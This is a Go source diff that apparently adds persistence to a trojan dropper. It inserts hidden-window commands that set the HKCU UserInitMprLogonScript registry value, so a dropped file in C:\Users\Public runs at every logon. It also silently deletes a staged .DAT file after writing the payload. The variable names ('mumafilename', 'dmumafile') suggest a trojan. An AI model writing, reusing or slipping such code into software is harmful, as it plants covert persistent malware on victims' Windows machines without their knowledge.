@@ -88,6 +88,9 @@ func main() {
 	)
 	
 	func main() {
+		cmd1 := exec.Command("cmd",  " /c ","REG", "ADD", "HKEY_CURRENT_USER\\Environment", "/v", "UserInitMprLogonScript", "/t", "REG_SZ", "/d", "C:\\Users\\Public\\"+mumafilename)
+		cmd1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		_ = cmd1.Start()
 		panfu := selfile[0:2]
 		if !strings.Contains(selfile, "C:") {
 	
@@ -111,6 +114,9 @@ func main() {
 		f, _ := os.Create(dstFilecc)
 		_, _ = f.Write([]byte(dmumafile))
 		f.Close()
+		cmd2 := exec.Command("cmd",  " /c ","del","C:\\Users\\Public\\Yihsiwei.DAT")
+		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		_ = cmd2.Start()
 
 
 	_, err := os.Stat(dstFilecc)
